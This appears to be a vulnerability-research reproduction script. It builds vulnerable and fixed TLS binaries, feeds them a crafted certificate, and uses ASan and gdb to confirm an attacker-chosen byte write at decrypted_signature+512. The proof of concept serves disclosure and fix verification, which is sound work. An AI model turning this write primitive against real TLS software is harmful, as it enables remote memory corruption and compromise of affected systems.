#!/bin/bash
# Reproduce the TLS-protocol chosen-byte result (wake W3).
# A: marker deadbeefcafebabe, B: marker 5aadbeefcafebabe. Fixed: no write.
# In-process RAM transport only; no host sockets, no external traffic.
set -e
HERE=$(cd "$(dirname "$0")" && pwd)
cd "$HERE"

# --- Run A: chosen bytes deadbeefcafebabe at decrypted_signature+512 ---
python3 gen-crafted-cert.py
bash build-crafted.sh vuln asan
bash build-crafted.sh fixed asan
bash build-crafted.sh vuln plain
timeout 30 ./tls_vuln_crafted_asan > run-vuln_crafted_asan.txt 2>&1 || true
timeout 20 ./tls_fixed_crafted_asan > run-fixed_crafted_asan.txt 2>&1 || true
timeout 40 gdb -q -batch -x gdb-crafted.gdb ./tls_vuln_crafted_plain \
  > run-vuln_crafted_a_plain-gdb.txt 2>&1 || true

# --- Run B: only the chosen byte at +512 changes, de -> 5a ---
python3 gen-crafted-cert.py 5aadbeefcafebabe
bash build-crafted.sh vuln plain
timeout 40 gdb -q -batch -x gdb-crafted.gdb ./tls_vuln_crafted_plain \
  > run-vuln_crafted_b_plain-gdb.txt 2>&1 || true

# Restore run-A state on disk.
python3 gen-crafted-cert.py
bash build-crafted.sh vuln plain

echo "=== vuln ASan (crafted cert, TLS stack) ==="
grep -E "AddressSanitizer|WRITE of size|decrypted_signature" run-vuln_crafted_asan.txt | head -3 || echo "no ASan report"
echo "=== fixed ASan (crafted cert) ==="
if grep -q -E "AddressSanitizer|WRITE of size" run-fixed_crafted_asan.txt; then
  grep -E "AddressSanitizer|WRITE of size" run-fixed_crafted_asan.txt | head -3
else
  echo "no ASan report (cert rejected at parse; handshake stalls)"
fi
echo "=== plain readback A / B, bytes at +512 ==="
grep "generated_hash" run-vuln_crafted_a_plain-gdb.txt | head -1
grep "generated_hash" run-vuln_crafted_b_plain-gdb.txt | head -1
